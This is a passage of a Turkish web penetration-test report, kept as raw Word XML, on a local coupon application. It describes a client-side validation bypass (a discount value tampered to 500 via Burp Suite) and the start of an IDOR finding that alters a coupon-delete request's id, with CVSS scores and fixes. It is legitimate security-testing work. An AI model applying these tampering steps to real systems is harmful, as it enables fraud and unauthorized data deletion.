              <w:t>Kupon sisteminde yapılan yetkisiz değişiklikler, işletmeler için büyük mali kayıplara yol açabilir. Ayrıca, sistemin güvenliğinin sorgulanması itibar kaybına neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="620199BA" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00593C92">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w:rsidRPr="00402B96" w14:paraId="073D0535" w14:textId="77777777" w:rsidTr="00C20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510350BB" w14:textId="77777777" w:rsidR="00593C92" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w:rsidRPr="00402B96" w14:paraId="77164A10" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4AFD6B9D" w14:textId="734F1722" w:rsidR="00593C92" w:rsidRPr="00C361DB" w:rsidRDefault="00A26EF1" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>4.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00593C92" w:rsidRPr="00402B96" w14:paraId="60FD5507" w14:textId="77777777" w:rsidTr="00C20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2D243476" w14:textId="77777777" w:rsidR="00593C92" w:rsidRPr="00402B96" w:rsidRDefault="00593C92" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58B92590" w14:textId="77777777" w:rsidR="00593C92" w:rsidRPr="00593C92" w:rsidRDefault="00593C92" w:rsidP="00593C92"/>
    <w:p w14:paraId="0C18569C" w14:textId="77777777" w:rsidR="00593C92" w:rsidRPr="00593C92" w:rsidRDefault="00593C92" w:rsidP="00593C92"/>
    <w:p w14:paraId="2073C05A" w14:textId="4A9BA3A2" w:rsidR="00FD2D0C" w:rsidRDefault="00D956CB" w:rsidP="00FD2D0C">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="00FD2D0C">
        <w:t xml:space="preserve"> ) </w:t>
      </w:r>
      <w:r w:rsidR="007D22A3" w:rsidRPr="007D22A3">
        <w:t>Client-Side Validation Bypass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A6F678" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00FD2D0C"/>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00FD2D0C" w14:paraId="3F265A3D" w14:textId="77777777" w:rsidTr="00376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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="074A0ECC" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w14:paraId="3E86C19E" w14:textId="77777777" w:rsidTr="00376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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="3D609D7E" w14:textId="130B4095" w:rsidR="00FD2D0C" w:rsidRDefault="007D22A3" w:rsidP="00376FE1">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="007D22A3">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Client-Side Validation Bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w14:paraId="73EF4984" w14:textId="77777777" w:rsidTr="00376FE1">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="52BE91E1" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w:rsidRPr="00057867" w14:paraId="683ED218" w14:textId="77777777" w:rsidTr="00376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3DE4328E" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7674571C" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00BF4DE0" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w:rsidRPr="00057867" w14:paraId="477CB4BF" w14:textId="77777777" w:rsidTr="00376FE1">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4D0EC58C" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00E14D4B" w:rsidRDefault="00FD2D0C" w:rsidP="002F0D44">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:hyperlink r:id="rId40" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> admin</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId41" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/coupon_add.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. Burada indirim yüzdesi maximum seçilebilecek değer 100 olarak ayarlanmıştır. Kupon ekleme formu doldurulur ve istek  </w:t>
            </w:r>
            <w:r w:rsidRPr="0020446C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>BurpSuite proxy aracı ile yakalanır</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">.  Yakalanan istek üzerindeki </w:t>
            </w:r>
            <w:r w:rsidRPr="00E14D4B">
              <w:t>discount=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>paremetresi 500 değeri ile değiştirilir. Böylece başarıyla %100 üzerinde bir indirim kuponu eklenir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ABD7C1A" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="624ECF07" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="781EC245" wp14:editId="4F0FBE16">
                  <wp:extent cx="5713730" cy="3306445"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="8255"/>
                  <wp:docPr id="1259155476" name="Resim 4" descr="metin, ekran görüntüsü,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155476" name="Resim 4" descr="metin, ekran görüntüsü, yazı tipi, tasarım içeren bir resim&#10;&#10;Açıklama otomatik olarak oluşturuldu"/>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3730" cy="3306445"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="04693ABB" w14:textId="510982A2" w:rsidR="00FD2D0C" w:rsidRPr="00C361DB" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="000D70F4">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Dosya Yükleme İsteği</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53FEBCB9" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6E9AE629" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00CF0A67" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w:rsidRPr="00057867" w14:paraId="1DAD99F8" w14:textId="77777777" w:rsidTr="00376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162ED4FD" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00057867" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w:rsidRPr="00D60321" w14:paraId="05F0676F" w14:textId="77777777" w:rsidTr="00376FE1">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4EBF372F" w14:textId="70BC398D" w:rsidR="007D22A3" w:rsidRPr="007D22A3" w:rsidRDefault="007D22A3" w:rsidP="002F0D44">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="007D22A3">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Sunucu tarafında giriş doğrulama ve sınırlandırma yapılmalı.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27F89171" w14:textId="605F227F" w:rsidR="00FD2D0C" w:rsidRPr="00402B96" w:rsidRDefault="007D22A3" w:rsidP="002F0D44">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="007D22A3">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Beklenmeyen girişlere karşı ek güvenlik önlemleri (rate limiting, input sanitization gibi) uygulanmalıdır.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w14:paraId="4CB09BFE" w14:textId="77777777" w:rsidTr="00376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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72BCB675" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w14:paraId="4850EB9F" w14:textId="77777777" w:rsidTr="00376FE1">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="3A794398" w14:textId="7C75DF39" w:rsidR="007D22A3" w:rsidRPr="007D22A3" w:rsidRDefault="007D22A3" w:rsidP="002F0D44">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:t>İş Mantığı İhlalleri :</w:t>
            </w:r>
            <w:r w:rsidRPr="007D22A3">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Sunucuya normalde izin verilmeyen değerler gönderilerek, uygulamanın iş mantığı bozulabilir. Örneğin, bir kullanıcı normalde 100 birim üzerinde sipariş veremiyorken, bu kısıt bypass edilerek büyük miktarlarda sipariş oluşturulabilir. Bu, stok yönetiminde hatalara veya sistemde beklenmedik davranışlara neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EFFEDEC" w14:textId="287E33A5" w:rsidR="007D22A3" w:rsidRPr="007D22A3" w:rsidRDefault="007D22A3" w:rsidP="002F0D44">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Finansal Kayıplar : </w:t>
            </w:r>
            <w:r w:rsidRPr="007D22A3">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Fiyat, miktar ya da indirim gibi değerlerin sunucu tarafında doğrulanmaması, finansal kayıplara yol açabilir. Örneğin, bir indirim kuponunun normalde maksimum %50 değerinde olması gerekirken, bu bypass edilerek %100 indirim yapılabilir. Bu, şirketin gelir kaybına neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E5D31EC" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="002F0D44">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w:rsidRPr="00402B96" w14:paraId="44E6EDB3" w14:textId="77777777" w:rsidTr="00376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636C1823" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w:rsidRPr="00402B96" w14:paraId="47F809D5" w14:textId="77777777" w:rsidTr="00376FE1">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="6A39D6F3" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00C361DB" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>3.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FD2D0C" w:rsidRPr="00402B96" w14:paraId="79D4F72A" w14:textId="77777777" w:rsidTr="00376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119E1D41" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00402B96" w:rsidRDefault="00FD2D0C" w:rsidP="00376FE1">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A1AFB11" w14:textId="77777777" w:rsidR="00FD2D0C" w:rsidRPr="00B24C32" w:rsidRDefault="00FD2D0C" w:rsidP="00FD2D0C"/>
    <w:p w14:paraId="74E1537B" w14:textId="1188A3E0" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>8) IDOR</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B43AC4" w14:paraId="2B5E5FCE" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="034C90DF" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w14:paraId="0CE59A74" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="5E8E1C6E" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>IDOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w14:paraId="784CE5DB" w14:textId="77777777" w:rsidTr="00C20FA7">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F631C98" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w:rsidRPr="00057867" w14:paraId="2AEC87E2" w14:textId="77777777" w:rsidTr="00C20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391AFF51" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BC18A89" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00BF4DE0" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w:rsidRPr="00057867" w14:paraId="1F1C2E3C" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4F25A1F9" w14:textId="260E95E3" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:hyperlink r:id="rId42" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="003220EF">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>şirket</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId43" w:history="1">
              <w:r w:rsidRPr="00135D4C">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/company_coupons.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. Listelenen kuponlardan herhangi bir tanesinin </w:t>
            </w:r>
            <w:r w:rsidRPr="00B43AC4">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SİL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> butonuna tıklanır ve istek burpsuite Proxy aracı ile tutulur. </w:t>
            </w:r>
            <w:r w:rsidRPr="00B43AC4">
              <w:t xml:space="preserve">GET /company_delete_coupon.php?id=6 HTTP/1.1 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">yandaki http header’ındaki </w:t>
            </w:r>
            <w:r w:rsidRPr="00B43AC4">
              <w:t>id=3</w:t>
